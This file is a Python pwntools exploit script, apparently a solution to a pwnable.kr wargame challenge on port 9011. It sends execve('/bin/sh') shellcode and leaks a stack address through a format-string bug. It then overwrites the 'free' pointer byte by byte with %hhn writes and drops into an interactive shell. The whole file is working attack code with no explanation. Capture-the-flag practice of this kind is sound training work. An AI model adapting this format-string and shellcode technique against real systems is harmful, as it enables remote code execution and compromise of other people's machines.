import pwn
from struct import pack

free = 0x000000602030
ret = 0x7fff3be60148
offset = 0x00007fff3be601b0 - ret
offset_shellcode = 0x20
#s = pwn.tubes.remote.remote('127.0.0.1',4444)
s = pwn.tubes.remote.remote('pwnable.kr',9011)
#raw_input('debug')
print s.sendlineafter(':', "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05")
print s.sendlineafter('>','2')
print s.sendlineafter('\x05','%10$p')
leak = s.recvuntil('>')
pos = leak.find('0x')
leak = leak[pos:pos+15]
print 'leak:',leak
ret_addr = int(leak,16) - offset
print 'ret:',hex(ret_addr)
shellcode = int(leak,16) - offset_shellcode
print 'shellcode:',hex(shellcode)
shellcode = pack('Q',shellcode)

print hex(ord(shellcode[0]))
offset1 = str(ord(shellcode[0])-6)
len_offset1 = len(offset1)
print offset1
if len_offset1 == 3:
	offset1 = int(offset1)
	offset1 += 1
	offset1 = str(offset1)

print hex(ord(shellcode[1]))
offset2 = str(ord(shellcode[1])-6)
len_offset2 = len(offset2)
print offset2
if len_offset2 == 3:
        offset2 = int(offset2)
        offset2 += 1
        offset2 = str(offset2)

print hex(ord(shellcode[2]))
offset3 = str(ord(shellcode[2])-6)
len_offset3 = len(offset3)
print offset3
if len_offset3 == 3:
        offset3 = int(offset3)
        offset3 += 1
        offset3 = str(offset3)

print hex(ord(shellcode[3]))
offset4 = str(ord(shellcode[3])-6)
len_offset4 = len(offset4)
print offset4
if len_offset4 == 3:
        offset4 = int(offset4)
        offset4 += 1
        offset4 = str(offset4)

print hex(ord(shellcode[4]))
offset5 = str(ord(shellcode[4])-6)
len_offset5 = len(offset5)
print offset5
if len_offset5 == 3:
        offset5 = int(offset5)
        offset5 += 1
        offset5 = str(offset5)

print hex(ord(shellcode[5]))
offset6 = str(ord(shellcode[5])-6)
len_offset6 = len(offset6)
print offset6
if len_offset6 == 3:
        offset6 = int(offset6)
        offset6 += 1
        offset6 = str(offset6)


s.sendline('2')
s.sendlineafter('\x05','a'*(8-len_offset1)+'%'+offset1+'c%8$hhn'+pack('Q',free))
print s.sendlineafter('>','2')
s.sendlineafter('\x05','a'*(8-len_offset2)+'%'+offset2+'c%8$hhn'+pack('Q',free+1))
print s.sendlineafter('>','2')
s.sendlineafter('\x05','a'*(8-len_offset3)+'%'+offset3+'c%8$hhn'+pack('Q',free+2))
print s.sendlineafter('>','2')
s.sendlineafter('\x05','a'*(8-len_offset4)+'%'+offset4+'c%8$hhn'+pack('Q',free+3))
print s.sendlineafter('>','2')
s.sendlineafter('\x05','a'*(8-len_offset5)+'%'+offset5+'c%8$hhn'+pack('Q',free+4))
print s.sendlineafter('>','2')
s.sendlineafter('\x05','a'*(8-len_offset6)+'%'+offset6+'c%8$hhn'+pack('Q',free+5))
print s.sendlineafter('>','3')

s.interactive()



